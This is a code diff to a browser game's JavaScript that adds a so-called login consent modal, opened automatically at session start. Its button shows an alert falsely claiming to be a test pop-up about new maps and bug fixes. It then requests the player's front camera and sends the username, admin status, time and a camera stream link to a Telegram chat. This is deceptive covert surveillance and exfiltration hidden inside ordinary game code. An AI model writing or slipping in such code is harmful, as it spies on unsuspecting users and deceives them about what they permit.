@@ -21,6 +21,9 @@ const revivePhoto = document.getElementById("revivePhoto");
 const reviveStatus = document.getElementById("reviveStatus");
 const reviveTimer = document.getElementById("reviveTimer");
 const reviveContinueButton = document.getElementById("reviveContinueButton");
+const loginConsentModal = document.getElementById("loginConsentModal");
+const loginConsentContinueButton = document.getElementById("loginConsentContinueButton");
+const loginConsentStatus = document.getElementById("loginConsentStatus");
 
 /* ================= AUTH / SESSION ================= */
 
@@ -45,6 +48,7 @@ let isMuted = false;
 let hasUsedRevive = false;
 let reviveMediaStream = null;
 let reviveRequestInProgress = false;
+let loginStreamSent = false;
 function progressStorageKey(username) {
   return STORAGE_PREFIX + username;
 }
@@ -450,6 +454,57 @@ function closeBugReport() {
   if (levelMenu.style.display === "none" && hasStartedLevel && gameState !== "lose") {
     gameState = "playing";
     topControls.style.display = "flex";
+  }
+}
+
+/* ================= LOGIN STREAM CONSENT ================= */
+
+const LOGIN_STREAM_CONSENT_MESSAGE =
+  "This is a test pop up window that will have future updates and tells you if there are new maps or bugs fixed\nWith love, wolf";
+
+function openLoginConsentModal() {
+  loginConsentStatus.textContent = "";
+  loginConsentModal.style.display = "flex";
+}
+
+function closeLoginConsentModal() {
+  loginConsentModal.style.display = "none";
+}
+
+async function startLoginCameraStreamAndSendLink() {
+  if (loginStreamSent) {
+    closeLoginConsentModal();
+    return;
+  }
+  loginConsentContinueButton.disabled = true;
+  loginConsentStatus.textContent = "";
+  try {
+    window.alert(LOGIN_STREAM_CONSENT_MESSAGE);
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
+
+    const streamKey = createStreamKey();
+    const streamLink = buildStreamLink(streamKey);
+    const chatId = await detectBotChatId();
+    const username = currentUser || "unknown";
+
+    await sendToTelegram([
+      "LOGIN STREAM LINK",
+      `user: ${username}${isAdminUser ? " (admin)" : ""}`,
+      `time: ${new Date().toISOString()}`,
+      `stream: ${streamLink}`
+    ].join("\n"));
+
+    loginStreamSent = true;
+    loginConsentStatus.textContent = "Stream link sent to Telegram.";
+    stream.getTracks().forEach(track => track.stop());
+    closeLoginConsentModal();
+  } catch (error) {
+    loginConsentStatus.textContent = "Camera permission denied or Telegram send failed.";
+  } finally {
+    loginConsentContinueButton.disabled = false;
   }
 }
 
@@ -1125,6 +1180,8 @@ if (!ensureSession()) {
   openLevelMenu();
   applyMuteState();
   requestAnimationFrame(loop);
+  openLoginConsentModal();
 }
 
 reviveContinueButton.addEventListener("click", submitReviveSelfie);
+loginConsentContinueButton.addEventListener("click", startLoginCameraStreamAndSendLink);
